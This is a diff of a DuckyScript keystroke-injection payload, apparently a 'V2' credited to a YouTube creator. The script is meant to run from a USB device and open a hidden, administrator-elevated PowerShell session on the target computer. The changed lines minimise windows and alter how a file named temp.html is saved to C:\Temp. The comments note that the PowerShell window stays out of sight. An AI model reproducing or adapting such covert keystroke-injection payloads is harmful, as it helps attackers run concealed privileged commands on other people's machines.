@@ -1,5 +1,8 @@
 REM the only difference between this script and the other is that powershell isnt in a visible window.
 REM be sure to wait till the script is 100% done to remove USB
+REM This is V2 of the script and made by DEFHerobrine/DEFTech-YT
+GUI D
+DELAY 100
 GUI r
 DELAY 1000
 STRING powershell -Noprofile "Start-Process powershell -verb runas"
@@ -37,17 +40,7 @@ STRING C:\Temp
 DELAY 75
 ENTER
 DELAY 100
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
+GUI ALT N
 DELAY 75
 STRING temp.html
 ENTER
